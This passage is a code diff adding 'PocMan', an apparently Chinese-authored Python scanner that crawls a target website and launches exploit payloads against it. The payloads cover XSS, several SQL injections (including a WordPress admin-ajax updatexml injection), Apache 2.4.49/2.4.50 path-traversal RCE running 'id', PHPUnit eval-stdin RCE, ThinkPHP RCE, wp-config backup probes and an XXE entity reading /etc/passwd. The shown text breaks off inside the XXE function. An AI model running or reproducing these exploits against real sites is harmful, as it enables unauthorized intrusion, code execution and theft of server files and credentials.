@@ -1,0 +1,2211 @@
+import os
+import sys
+import concurrent.futures
+import socket
+import getopt
+import time
+import http.cookies
+import requests
+import re
+from concurrent.futures import ThreadPoolExecutor, as_completed, wait
+import datetime
+from fake_useragent import UserAgent
+from tqdm import tqdm
+from set.config import cms_patterns
+import subprocess
+from secrets import token_hex
+import json
+import random
+import string
+import base64
+import urllib.parse
+import dns.resolver
+
+
+# 主类
+class PocMan:
+    def __init__(self):
+        self._ua = UserAgent()
+        self._url = None
+        self._depth = 1
+        self._cookie = None
+        self._threads = 10
+        self._verify = True
+        self._headers = None
+        self._proxy = None
+
+    def _banner(self):
+        banner = """  
+                  ██████╗  ██████╗  ██████╗ ███╔███╗  ██████╗ ███╗   ██╗
+                  ██╔══██╗██╔═══██╗██╔════╝██║███╝██╗██╔═══██║████╗  ██║
+                  ██████╔╝██║   ██║██║     ██║ █╝ ██║████████║██╔██╗ ██║ 
+                  ██╔═══╝ ██║   ██║██║     ██║    ██║██╔═══██║██║╚██╗██║  
+                  ██║     ╚██████╔╝╚██████╗██║    ██║██║   ██║██║ ╚████║   
+                  ╚═╝      ╚═════╝  ╚═════╝╚═╝    ╚═╝╚═╝   ╚═╝╚═╝  ╚═══╝  
+[WARING][*] 这仅仅是个开始                                     脚本:aKyo     版本: v1.01.8  
+[*] 通过源码递归、链接数量、枚举方式进行网站自动漏扫,通过自动识别传参，替换参数验证漏洞  
+[*] 通过验证域名规避误扫,支持市面绝大数CMS识别
+"""
+        print(banner, end="")
+
+    def _use(self):
+        str = ":(\n[!]python pocman.py -u http://www.exmple.com/\n[!]python pocman.py -h or --help"
+        print(str)
+
+
+    def _help(self):
+        self._banner()
+        tips = """
+-u <url>            指定url
+-c <cookie>         指定cookie,传入cookie值程序自动处理,例:PHPSESSID=xxxxxx; xxxxx=;
+-t <thread>         指定线程/默认为10
+-a <user-agent>     指定请求头,脚本默认随机请求头     注:请求头用引号括起来    
+-d <depth>          指定深度，默认为1，目前递归存在与进度条刷屏问题，深度为1时正常运行
+-s <ssl>            默认为Ture开启SSL验证，指定False关闭验证
+-p <proxy>          指定代理,例:127.0.0.1:9527
+        """
+        print(tips)
+
+    def _point_check(self, url, depth, cookie, header, verify, theads, proxy):
+        if url:
+            print(f"[{current_time}][-] 目标 : {url}")
+        if depth:
+            print(f"[{current_time}][-] 深度 : {depth}")
+        if cookie:
+            print(f"[{current_time}][-] Cookie : {cookie}")
+        if header:
+            print(f"[{current_time}][-] Header : {header}")
+        if verify:
+            print(f"[{current_time}][-] SSL : {verify}")
+        if theads:
+            print(f"[{current_time}][-] 线程 : {theads}")
+        if proxy:
+            ip = proxy['http']
+            print(f"[{current_time}][-] 代理 : {ip}")
+
+    def _http_header_check(self):
+        self._banner()
+        print(":(\n[!]python pocman.py -u http://www.exmple.com/\n[!]必须含有请求协议,如http://或者https://协议:(")
+
+    def _run(self):
+        try:
+            opts, args = getopt.getopt(sys.argv[1:], "hu:c:t:d:s:a:p:", ["help"])
+        except Exception as e:
+            self._banner()
+            self._use()
+            sys.exit(1)
+        if len(sys.argv) < 2 or len(sys.argv) > 15:
+            self._banner()
+            self._use()
+            sys.exit()
+        try:
+            for opt, arg in opts:
+                if opt in ("-h", "--help"):
+                    self._help()
+                    sys.exit()
+                elif opt == "-u":
+                    self._url = arg.strip('/ ')
+                elif opt == "-c":
+                    self._cookie = arg
+                elif opt == "-t":
+                    self._threads = int(arg)
+                elif opt == "-d":
+                    self._depth = int(arg)
+                elif opt == "-a":
+                    self._headers = arg
+                elif opt == "-p":
+                    self._proxy = arg
+                elif opt == "-s":
+                    self._verify = True if arg.lower() == "true" else False
+            self._banner()
+            print("[!] 程序确认此次目标后会自动删除上次目标缓存文件，如有需要请单独保存")
+            if "://" not in self._url:
+                self._http_header_check()
+                sys.exit()
+            if self._depth > 1:
+                print(f"[{current_time}][WARING] 当前深度只支持1!!!")
+                sys.exit()
+            if self._proxy:
+                if ":" not in self._proxy or "http" in self._proxy:
+                    self._banner()
+                    print(f'[!] 代理格式错误，例:127.0.0.1:9527或www.xxx.com:9527,单IP默认为80')
+                    sys.exit()
+                proxies_str = {"http": "http://" + self._proxy, "https": "https://" + self._proxy}
+                self._proxy = proxies_str
+            cookie_dict = {}
+            if self._cookie:
+                cookie_str = http.cookies.SimpleCookie(self._cookie)
+                for key, morsel in cookie_str.items():
+                    cookie_dict[key] = morsel.value
+            if self._headers:
+                self._headers = self._headers
+            else:
+                self._headers = self._ua.random
+            self._point_check(self._url, self._depth, cookie_dict, self._headers, self._verify, self._threads, self._proxy)
+            return self._url, self._depth, self._threads, cookie_dict, self._verify, self._headers, self._proxy
+        except Exception as e:
+            print(f"[{current_time}][!] pocman.py -h or --help")
+
+    # 删除缓存文件
+    def _file_check(self):
+        print(f"[{current_time}][!] 检测并删除缓存文件，漏洞文件不会删除......")
+        file_list = [
+            './result/link.txt',
+            './result/domain.txt',
+            './result/db.txt',
+            './result/svn.txt',
+            './result/xml.txt',
+            './result/js.txt',
+            './result/domain_pwds.txt'
+        ]
+        for link_path in file_list:
+            if os.path.exists(link_path):
+                os.unlink(link_path)
+        print(f"[{current_time}][*] 缓存文件删除完成")
+
+    # 模式检测
+    def _run_check(self, url, depth):
+        pass
+
+    # 主函数
+    def main(self):
+        global current_time
+        global gl_cookie
+        global gl_verify
+        global gl_headers
+        global gl_proxy
+        now = datetime.datetime.now()
+        current_time = now.strftime("%H:%M:%S")
+        url, depth, threads, gl_cookie, gl_verify, gl_headers, gl_proxy = self._run()
+        self._file_check()
+        if url.count('/') >= 3:
+            new_url = url.split('/')[0] + '//' + url.split('/')[2]
+            Info(new_url, threads).main()
+        else:
+            Info(url, threads).main()
+        if depth != 1:
+            # Craw().url_code_link(url, self._threads, self._depth, flag=True)
+            print(f'[{current_time}][!] 当前深度只能为1')
+            return
+        else:
+            Craw().url_code_link(url, threads, depth)
+
+
+# 爬虫类
+class Craw:
+    def __init__(self):
+        self._ua = UserAgent()
+        if gl_headers:
+            self._header = {"User-Agent": gl_headers}
+        else:
+            self._header = {"User-Agent": self._ua.random}
+        self._url_list = []
+        self._domain_list = []
+        self._svn_list = []
+        self._db_list = []
+        self._js_list = []
+        self._xml_list = []
+        self._depth_check = []
+
+    def _txt_check(self):
+        for res_url in self._url_list:
+            if '.svn' in res_url:
+                if res_url not in self._svn_list:
+                    self._svn_list.append(res_url)
+            elif '.db' in res_url:
+                if res_url not in self._db_list:
+                    self._db_list.append(res_url)
+            elif '.js' in res_url:
+                if res_url not in self._js_list:
+                    self._js_list.append(res_url)
+            elif '.xml' in res_url:
+                if res_url not in self._xml_list:
+                    self._xml_list.append(res_url)
+        for url in self._svn_list:
+            with open('./result/svn.txt', 'a') as w:
+                w.write(url + '\n')
+        for url in self._db_list:
+            with open('./result/db.txt', 'a') as w:
+                w.write(url + '\n')
+        for url in self._xml_list:
+            with open('./result/xml.txt', 'a') as w:
+                w.write(url + '\n')
+        for url in self._js_list:
+            with open('./result/js.txt', 'a') as w:
+                w.write(url + '\n')
+
+    #  文本分类
+    def _url_txt_check(self):
+        with open('result/link.txt', 'a+') as w:
+            for res_url in self._url_list:
+                w.seek(0)
+                text_content = w.read()
+                if res_url not in text_content:
+                    w.write(res_url + '\n')
+        with open('result/domain.txt', 'a+') as w:
+            for res_domain in self._domain_list:
+                w.seek(0)
+                text_content = w.read()
+                if res_domain not in text_content:
+                    w.write(res_domain + '\n')
+
+    def _depth_url_check(self, url):
+        self._webinfo(url)
+
+    # 递归
+    def _recurrence(self, url, threads):
+        res_url_list = [res_url for res_url in self._url_list if res_url.split('/')[2] == url.split('/')[2] and 'http' in self._url_list]
+        if res_url_list:
+            with ThreadPoolExecutor(threads) as pool:
+                try:
+                    futures = [pool.submit(self._depth_url_check, res_url) for res_url in res_url_list]
+                except Exception as e:
+                    pass
+                for future in concurrent.futures.as_completed(futures):
+                    future.result()
+            wait(futures)
+            self._recurrence(url, threads)
+
+    # 释放资源
+    def _clean(self):
+        self._url_list = []
+        self._domain_list = []
+        self._svn_list = []
+        self._db_list = []
+        self._js_list = []
+        self._xml_list = []
+
+    # 爬取链接
+    def _webmap(self, url):
+        try:
+            res_sitemap = requests.get(url=url + "/sitemap.xml", headers=self._header, cookies=gl_cookie, verify=gl_verify, timeout=6, proxies=gl_proxy)
+            res_sitemap.encoding = res_sitemap.apparent_encoding
+            if res_sitemap.status_code == 200:
+                sitemap_link = re.finditer('(https?|ftp|file)://[-A-Za-z0-9+&@#/%?=~_|!:,.;]+[-A-Za-z0-9+&@#/%=~_|]', res_sitemap.text)
+                for sitemap_url in sitemap_link:
+                    self._url_list.append(sitemap_url.group())
+                    if sitemap_url.group().split('/')[2] != url.split('/')[2]:
+                        self._domain_list.append(sitemap_url.group().split('/')[2])
+        except Exception as e:
+            pass
+        try:
+            res_robots = requests.get(url=url + "/robots.txt", headers=self._header, cookies=gl_cookie, verify=gl_verify, timeout=6, proxies=gl_proxy)
+            res_robots.encoding = res_robots.apparent_encoding
+            if res_robots.status_code == 200:
+                robots_link = re.finditer('(https?|ftp|file)://[-A-Za-z0-9+&@#/%?=~_|!:,.;]+[-A-Za-z0-9+&@#/%=~_|]', res_robots.text)
+                robots_link2 = re.finditer('Disallow: [-A-Za-z0-9+&@#/%?=~_|!:,.;]+[-A-Za-z0-9+&@#/%=~_|]', res_robots.text)
+                for robots_url in robots_link:
+                    self._url_list.append(robots_url.group())
+                    if robots_url.group().split('/')[2] != url.split('/')[2]:
+                        self._domain_list.append(robots_url.group().split('/')[2])
+                for robots_url in robots_link2:
+                    self._url_list.append(url + robots_url.group().split(':')[-1].strip())
+        except Exception as e:
+            pass
+
+    def _webinfo(self, url):
+        counts = url.count('/')
+        check_domain = ['google.', 'baidu.', 'jd.', 'facebook.', 'youtube.', 'sitemaps.']
+        try:
+            response = requests.get(url=url, headers=self._header, cookies=gl_cookie, verify=gl_verify, timeout=6, proxies=gl_proxy)
+            if response.status_code == 200:
+                response.encoding = response.apparent_encoding
+                url_link2 = re.finditer('(https?|ftp|file)://[-A-Za-z0-9+&@#/%?=~_|!:,.;]+[-A-Za-z0-9+&@#/%=~_|]', response.text)
+                url_link = re.finditer('href=".*?"|src=".*?"|srcset=".*?"', response.text)
+                for res_link in url_link2:
+                    if res_link.group() not in self._url_list:
+                        self._url_list.append(res_link.group())
+                    if res_link.group().split('/')[2] not in self._domain_list:
+                        self._domain_list.append(res_link.group().split('/')[2])
+
+                for response_data in url_link:
+                    res = response_data.group().split('"', 1)[-1].strip('"')
+                    if "://" in res:
+                        pass
+                        # self._url_list.append(res)
+                        # domain = res.split('//', 1)[-1].split('/', 1)[0]
+                        # if domain not in self._domain_list:
+                        #     self._domain_list.append(domain)
+                    elif "//" in res and "://" not in res:
+                        new_url = "https:" + res
+                        self._url_list.append(new_url)
+                        domain = new_url.split('//', 1)[-1].split('/', 1)[0]
+                        if domain not in self._domain_list:
+                            self._domain_list.append(domain)
+                    elif res[0] == '/':
+                        if counts < 3:
+                            new_url = url + res
+                            self._url_list.append(new_url)
+                        else:
+                            new_url = url.split('/', 3)[0] + '//' + url.split('/', 3)[2] + res
+                            self._url_list.append(new_url)
+                    elif res[0] != '/':
+                        if counts < 3:
+                            new_url = url + '/' + res
+                            self._url_list.append(new_url)
+                        else:
+                            new_url = url.split('/', 3)[0] + '//' + url.split('/', 3)[2] + res
+                            self._url_list.append(new_url)
+
+        except Exception as e:
+            pass
+
+    def _dir_link(self, threads):
+        print(f"[{current_time}][-] 开始目录链接枚举......")
+        time.sleep(1)
+        with tqdm(total=len(self._url_list), desc='目录链接枚举进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
+            with ThreadPoolExecutor(threads) as pool:
+                futures = [pool.submit(self._webinfo, url) for url in self._url_list]
+                for future in futures:
+                    future.result()
+                    pbar.update(1)
+            wait(futures)
+            time.sleep(1)
+        print(f"[{current_time}][-] 目录链接枚举结束")
+
+    def _code_means(self, url, flag=False):
+        if not flag:
+            self._webmap(url)
+        self._webinfo(url)
+
+    def _point_out(self, point_out, flag=True):
+        if flag:
+            # print(f"[{current_time}][-] {point_out}")
+            pass
+        else:
+            print(f"[{current_time}][-] {point_out}")
+
+    def _dir_scan(self, dir_url):
+        try:
+            response = requests.get(url=dir_url, headers=self._header, cookies=gl_cookie, verify=gl_verify, timeout=2, proxies=gl_proxy)
+            if response.status_code == 200:
+                self._url_list.append(dir_url)
+        except Exception as e:
+            pass
+
+    def _dir_url_work(self, url, threads):
+        self._point_out("开始目录枚举......", False)
+        time.sleep(1)
+        with open('./data/dirscan.txt', 'r') as dir_txt:
+            dir_txt.seek(0)
+            dir_lines = dir_txt.readlines()
+            with tqdm(total=len(dir_lines), desc='目录枚举进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
+                with ThreadPoolExecutor(threads) as pool:
+                    try:
+                        futures = [pool.submit(self._dir_scan, url + '/' + dir.strip()) for dir in dir_lines]
+                    except Exception as e:
+                        pass
+                    for future in concurrent.futures.as_completed(futures):
+                        future.result()
+                        pbar.update(1)
+                wait(futures)
+        time.sleep(1)
+        self._point_out("目录枚举已完成", False)
+        time.sleep(2)
+        if self._url_list:
+            self._dir_link(threads)
+
+    # sitemap/robots/源码链接爬取，递归爬取
+    def url_code_link(self, url, threads, depth=1, flag=False):
+        if depth == 1:
+            #  枚举
+            if url.count('/') >= 3:
+                new_url = url.split('/')[0] + '//' + url.split('/')[2]
+                self._dir_url_work(new_url, threads)
+            else:
+                self._dir_url_work(url, threads)
+            # 链接整理
+            self._code_means(url, flag)
+            # 整理结果
+            self._point_out("开始整理URL返回结果......", flag)
+            self._url_txt_check()
+            self._point_out("URL返回结果整理完成", flag)
+            self._point_out("URL数据分类......", flag)
+            self._txt_check()
+            self._point_out("URL数据分类完成", flag)
+            if url.count('/') >= 3:
+                new_url = url.split('/')[0] + '//' + url.split('/')[2]
+                Pocs().main(new_url.strip(), threads)
+            else:
+                Pocs().main(url.strip(), threads)
+        elif depth != 1:
+            # 递归
+            # self._dir_url_work(url, threads)
+            # self._code_means(url, flag)
+            # self._recurrence(url, threads)
+            # self._url_txt_check()
+            # self._txt_check()
+            print(f"[{current_time}][!] 目前深度只能为1!!!!!!")
+
+
+# 漏洞存放类
+class Pocs:
+    def __init__(self):
+        self._ua = UserAgent()
+        if gl_headers:
+            self._header = {"User-Agent": gl_headers}
+        else:
+            self._header = {"User-Agent": self._ua.random}
+
+    def _xss(self, payload_url, payload):
+        try:
+            response = requests.get(url=payload_url, headers=self._header, cookies=gl_cookie, verify=gl_verify, timeout=2, proxies=gl_proxy)
+            response.encoding = response.apparent_encoding
+            if response.status_code == 200 and payload in response.text:
+                with open('result/xss.txt', 'a') as w:
+                    w.write(payload_url + '\n')
+        except Exception as e:
+            pass
+
+    def _xss_work(self, link_list, threads):
+        print(f"[{current_time}][-] 开始XSS检测......")
+        new_url_list = []
+        with open('./set/xss_payload.txt', 'r') as payload_txt:
+            payload_txt.seek(0)
+            payload_lines = payload_txt.readlines()
+            for url in link_list:
+                counts = url.count('=')
+                for payload in payload_lines:
+                    for num in range(1, counts + 1):
+                        xss_url = url.replace(url.split('=')[num].split('&' or '/')[0], payload.strip())
+                        new_url_list.append(xss_url)
+            time.sleep(1)
+            with tqdm(total=(len(new_url_list)), desc='Xss检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
+                with ThreadPoolExecutor(threads) as pool:
+                    try:
+                        futures = [pool.submit(self._xss, xss_url, payload.strip()) for xss_url in new_url_list]
+                    except Exception as e:
+                        pass
+
+                    for future in concurrent.futures.as_completed(futures):
+                        future.result()
+                        pbar.update(1)
+                wait(futures)
+            time.sleep(1)
+            self._point_out(future, "xss")
+
+    def _sql(self, url, choose):
+        if choose == "time":
+            try:
+                time_start = time.time()
+                response = requests.get(url=url, headers=self._header, cookies=gl_cookie, verify=gl_verify, timeout=12, proxies=gl_proxy)
+                time_end = time.time()
+                res_time = time_end - time_start
+                if response.status_code == 200 and res_time > 10:
+                    with open('./result/sql.txt', 'a') as w:
+                        w.write(url + '\n')
+            except Exception as e:
+                pass
+        elif choose == "headers":
+            sql_headers = {
+                "User_Agent": "id=1' and 1=2-- a",
+                "Referer": "id=1' and 1=2-- a"
+            }
+            sql_cookies = {"Cookies": f"{gl_cookie}id=1' and 1=2-- a"}
+            try:
+                response_one = requests.get(url=url, headers=self._header, cookies=gl_cookie, verify=gl_verify, timeout=2, proxies=gl_proxy)
+                response_one_content = response_one.content
+                if response_one.status_code == 200:
+                    try:
+                        response_two = requests.get(url=url, headers=sql_headers, cookies=sql_cookies, verify=gl_verify, timeout=2, proxies=gl_proxy)
+                        if response_two.status_code == 200 and len(response_two.content) != len(response_one_content):
+                            with open('./result/sql.txt', 'a') as w:
+                                w.write('头部注入:' + url + '\n')
+                    except Exception as e:
+                        pass
+            except Exception as e:
+                pass
+        elif choose == "get":
+            pocs = ['"', "'"]
+            counts = url.count('=')
+            response_url = [url.replace(url.split('=')[num].split('&' or '/')[0], '211' + poc) for num in range(1, counts + 1) for poc in pocs]
+            try:
+                response_one = requests.get(url=url, headers=self._header, cookies=gl_cookie, verify=gl_verify, timeout=2, proxies=gl_proxy)
+                if response_one.status_code == 200:
+                    response_one_content = response_one.content
+                    for sql_url in response_url:
+                        try:
+                            response_two = requests.get(url=sql_url, headers=self._header, cookies=gl_cookie, verify=gl_verify, timeout=2, proxies=gl_proxy)
+                            response_two_content = response_two.content
+                            if response_two.status_code == 200 and len(response_one_content) != len(response_two_content):
+                                with open('./result/sql.txt', 'a') as w:
+                                    w.write(sql_url + '\n')
+                        except Exception as e:
+                            pass
+            except Exception as e:
+                pass
+
+    def _sql_time(self, links_lines, threads):
+        # sql time
+        print(f"[{current_time}][-] 开始Sql-Time检测......")
+        sql_url_list = []
+        with open('set/sql_time.txt', 'r') as payload_txt:
+            payload_txt.seek(0)
+            payload_lines = payload_txt.readlines()
+            for url in links_lines:
+                counts = url.count('=')
+                for payload in payload_lines:
+                    for num in range(1, counts + 1):
+                        sql_url = url.replace(url.split('=')[num].split('&' or '/')[0], payload.strip())
+                        sql_url_list.append(sql_url)
+        time.sleep(1)
+        with tqdm(total=len(sql_url_list), desc='Sql-Time检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
+            with ThreadPoolExecutor(threads) as pool:
+                try:
+                    futures = [pool.submit(self._sql, url, "time") for url in sql_url_list]
+                except Exception as e:
+                    pass
+
+                for future in concurrent.futures.as_completed(futures):
+                    future.result()
+                    pbar.update(1)
+            wait(futures)
+        time.sleep(1)
+        self._point_out(future, "sql-time")
+
+    def _sql_get(self, link_list, threads):
+        print(f"[{current_time}][-] 开始Sql-Get检测......")
+        #  sql get
+        time.sleep(1)
+        with tqdm(total=len(link_list), desc='Sql-Get检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
+            with ThreadPoolExecutor(threads) as pool:
+                try:
+                    futures = [pool.submit(self._sql, url, "get") for url in link_list]
+                except Exception as e:
+                    pass
+
+                for future in concurrent.futures.as_completed(futures):
+                    future.result()
+                    pbar.update(1)
+            wait(futures)
+        time.sleep(1)
+        self._point_out(future, "sql-get")
+
+    def _sql_header(self, link_list, threads):
+        print(f"[{current_time}][-] 开始Sql-Header检测......")
+        time.sleep(1)
+        with tqdm(total=len(link_list), desc='Sql-Header检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
+            with ThreadPoolExecutor(threads) as pool:
+                try:
+                    futures = [pool.submit(self._sql, url, "headers") for url in link_list]
+                except Exception as e:
+                    pass
+
+                for future in concurrent.futures.as_completed(futures):
+                    future.result()
+                    pbar.update(1)
+            wait(futures)
+        time.sleep(1)
+        self._point_out(future, "sql-headers")
+
+    def _sql_work(self, link_list, links_lines, threads):
+        self._sql_time(links_lines, threads)
+        time.sleep(2)
+        self._sql_get(link_list, threads)
+        time.sleep(2)
+        self._sql_header(link_list, threads)
+
+    def _log4j(self):
+        pass
+
+    def _dir(self, url):
+        print(f"[{current_time}][-] 开始检测目录穿越......")
+        try:
+            response = requests.get(url=url, headers=self._header, cookies=gl_cookie, verify=gl_verify, timeout=3, proxies=gl_proxy)
+            if "root:" in response.text:
+                with open('./result/dir.txt', 'a') as w:
+                    w.write(url + '\n')
+        except Exception as e:
+            pass
+        self._point_out(None, "dir")
+
+    def _pma(self, url):
+        print(f"[{current_time}][-] 开始检测phpmyadmin历史漏洞......")
+        try:
+            response = requests.get(url=url, headers=self._header, cookies=gl_cookie, verify=gl_verify, timeout=3, proxies=gl_proxy)
+            response.encoding = response.apparent_encoding
+            if response.status_code == 200 and "admin" in response.text:
+                with open('./result/pma.txt', 'a') as w:
+                    w.write(url + '\n')
+        except Exception as e:
+            pass
+        self._point_out(None, "pma")
+
+    def _thinkphp(self, url):
+        try:
+            response = requests.get(url=url, headers=self._header, cookies=gl_cookie, verify=gl_verify, timeout=3, proxies=gl_proxy)
+            if "disable_functions" in response.text:
+                with open('./result/tprce.txt', 'a') as w:
+                    w.write(url + '\n')
+        except Exception as e:
+            pass
+
+    def _thinkphp_work(self, demo_url, threads):
+        print(f"[{current_time}][-] 开始检测ThinkPhp-Rce......")
+        tp_url_list = []
+        with open('./set/thinkphp_payload.txt', 'r') as tp:
+            tp.seek(0)
+            payload_lines = tp.readlines()
+            for payload in payload_lines:
+                tp_url = demo_url + payload.strip()
+                tp_url_list.append(tp_url)
+        time.sleep(1)
+        with tqdm(total=len(tp_url_list), desc='Tp-rce检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
+            with ThreadPoolExecutor(threads) as pool:
+                try:
+                    futures = [pool.submit(self._thinkphp, tp_url) for tp_url in tp_url_list]
+                except Exception as e:
+                    pass
+                # wait(futures)
+                for future in concurrent.futures.as_completed(futures):
+                    future.result()
+                    pbar.update(1)
+            wait(futures)
+        time.sleep(1)
+        self._point_out(future, "tp-rce")
+
+    def _wordpress(self, url):
+        try:
+            response = requests.get(url=url, headers=self._header, cookies=gl_cookie, verify=gl_verify, timeout=2, proxies=gl_proxy)
+            response.encoding = response.apparent_encoding
+            if response.status_code == 200 and ('name' in response.text or 'author' in response.text):
+                with open('./result/wp_user.txt', 'a') as w:
+                    w.write(url + '\n')
+        except Exception as e:
+            pass
+
+    def _wp_feed(self, url):
+        try:
+            response = requests.get(url=url, headers=self._header, cookies=gl_cookie, verify=gl_verify, timeout=2, proxies=gl_proxy)
+            response.encoding = response.apparent_encoding
+            if response.status_code == 200 and 'error' not in response.text and '404' not in response.text:
+                with open('./result/wp_user.txt', 'a') as w:
+                    w.write(url + '\n')
+        except Exception as e:
+            pass
+
+    def _wp_feed_work(self, url, threads):
+        print(f'[{current_time}][-] 开始检测Wordpress信息......')
+        poc_list = [
+            '/wp-content/uploads/',
+            '/wp-content/debug.log',
+            '/feed',
+            '/wp-content/plugins/PLUGINNAME/readme.txt',
+            '/wp-content/themes/THEMENAME/style.css ',
+            '/wp-content/themes/THEMENAME/readme.txt',
+            '/.wp-config.php.swp',
+            '/wp-config.inc',
+            '/wp-config.old',
+            '/wp-config.txt',
+            '/wp-config.html',
+            '/wp-config.php.bak',
+            '/wp-config.php.dist',
+            '/wp-config.php.inc',
+            '/wp-config.php.old',
+            '/wp-config.php.save',
+            '/wp-config.php.swp',
+            '/wp-config.php.txt',
+            '/wp-config.php.zip',
+            '/wp-config.php.html',
+            '/wp-config.php',
+            '/wp-login.php?action=register'
+        ]
+        with tqdm(total=len(poc_list), desc='Wordpress信息检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
+            with ThreadPoolExecutor(threads) as pool:
+                try:
+                    futures = [pool.submit(self._wp_feed, url + poc) for poc in poc_list]
+                except Exception as e:
+                    pass
+                for future in concurrent.futures.as_completed(futures):
+                    future.result()
+                    pbar.update(1)
+            wait(futures)
+        time.sleep(1)
+        self._point_out(futures, "Wordpress信息")
+
+    def _wp_sql(self, url):
+        print(f'[{current_time}][-] 开始检测Wordpress-sql注入......')
+        new_url = url + '/wp-admin/admin-ajax.php'
+        data = {
+            'action': 'aa&query_vars[tax_query][1][include_children]=1&query_vars[tax_query][1][terms][1]=1) or updatexml(0x7e,concat(1,user()),0x7e)#&query_vars[tax_query][1][field]=term_taxonomy_id',
+        }
+        try:
+            response = requests.post(url=new_url, headers=self._header, data=data, cookies=gl_cookie, verify=gl_verify, timeout=2, proxies=gl_proxy)
+            response.encoding = response.apparent_encoding
+            if 'XPATH' in response.text:
+                with open('./result/wp_user.txt', 'a') as w:
+                    w.write('存在sql注入:' + url + '\n')
+        except Exception as e:
+            pass
+        self._point_out(None, "Wordpress-sql")
+
+    def _wordpress_work(self, url, threads):
+        print(f"[{current_time}][-] 开始检测是否泄漏Wordpress-User......")
+        wp_url_list = []
+        with open('./set/wp_user.txt', 'r') as payloads_txt:
+            payloads_txt.seek(0)
+            payloads_lines = payloads_txt.readlines()
+            for payload in payloads_lines:
+                wp_url = url + payload
+                wp_url_list.append(wp_url)
+        time.sleep(1)
+        with tqdm(total=len(wp_url_list), desc='Wp-User检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
+            with ThreadPoolExecutor(threads) as pool:
+                try:
+                    futures = [pool.submit(self._wordpress, wp_url) for wp_url in wp_url_list]
+                except Exception as e:
+                    pass
+                # wait(futures)
+                for future in concurrent.futures.as_completed(futures):
+                    future.result()
+                    pbar.update(1)
+            wait(futures)
+        time.sleep(1)
+        self._point_out(future, "wordpress-user")
+
+    def _point_out(self, future, point_out, flag=True):
+        if flag:
+            print(f"[{current_time}][-] {point_out}检测结束")
+
+    def _unauthorized(self, url):
+        try:
+            response = requests.post(url=url, headers=self._header, cookies=gl_cookie, verify=gl_verify, timeout=2, proxies=gl_proxy)
+            if response.status_code == 200:
+                with open('./result/wsq.txt', 'a') as w:
+                    w.write(url + '\n')
+        except Exception as e:
+            pass
+
+    def _unauthorized_work(self, threads):
+        pass
+
+    def _apache_http(self, url):
+        s = requests.Session()
+        try:
+            session = requests.Session()
+            command = "echo; id"
+            req = requests.Request('POST', url=url, data=command, params=gl_proxy)
+            prepare = req.prepare()
+            prepare.url = url
+            response = session.send(prepare, timeout=5)
+            output = response.text
+            if "uid" in output:
+                with open('./result/apche.txt', 'a') as w:
+                    w.write('存在apache-http系列漏洞' + url + '\n')
+        except Exception as e:
+            pass
+
+    def _apache_http_work(self, url, threads):
+        print(f"[{current_time}][-]开始检测Apache 2.4.49-2.4.50 RCE......")
+        apache2449_payload = url + '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash'
+        apache2450_payload = url + '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash'
+        payloads = [apache2449_payload, apache2450_payload]
+        time.sleep(1)
+        with tqdm(total=len(payloads), desc='Apache检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
+            with ThreadPoolExecutor(threads) as pool:
+                try:
+                    futures = [pool.submit(self._apache_http, url) for url in payloads]
+                except Exception as e:
+                    pass
+                for future in concurrent.futures.as_completed(futures):
+                    future.result()
+                    pbar.update(1)
+            wait(futures)
+        time.sleep(1)
+        self._point_out(None, "Apache")
+
+    def _php_unit(self, site):
+        try:
+            req = requests.get(site, headers={
+                "Content-Type": "text/html",
+                "User-Agent": f"Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0",
+            }, data="<?php echo md5(phpunit_rce); ?>", proxies=gl_proxy, verify=gl_verify)
+            if "6dd70f16549456495373a337e6708865" in req.text:
+                with open('./result/php.txt', 'a') as w:
+                    w.write('存在php-unin漏洞' + site + '\n')
+        except Exception as e:
+            pass
+
+    def _php_work(self, url, threads):
+        print(f"[{current_time}][-] 开始检测PHP-Unin漏洞......")
+        phpfiles = [
+            "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+            "/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+            "/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+            "/laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+            "/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+            "/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
+        ]
+        site = url
+        if site.endswith("/"):
+            site = list(site)
+            site[len(site) - 1] = ''
+            site = ''.join(site)
+        time.sleep(1)
+        with tqdm(total=len(phpfiles), desc='PHP-Unin检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
+            with ThreadPoolExecutor(threads) as pool:
+                try:
+                    pathvulns = [pool.submit(self._php_unit, site + i) for i in phpfiles]
+                except Exception as e:
+                    pass
+                for pathvuln in concurrent.futures.as_completed(pathvulns):
+                    pathvuln.result()
+                    pbar.update(1)
+            wait(pathvulns)
+        time.sleep(1)
+        self._point_out(None, "PHP-Unin")
+
+    def _xxe(self, url):
+        print(f"[{current_time}][-] 开始检测xxe漏洞......")
+        try:
+            # 发送正常请求
+            start_time = time.time()
+            requests.get(url=url, headers=self._header, cookies=gl_cookie, verify=gl_verify, proxies=gl_proxy)
+            end_time = time.time()
+            normal_time = end_time - start_time
+
+            # 发送恶意请求
+            xml = """
+            <!DOCTYPE foo [
+            <!ELEMENT foo ANY >
+            <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+            <foo>&xxe;</foo>
+            """
+            xxe_header = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0", "Content-Type": "text/xml"}
+            start_time = time.time()
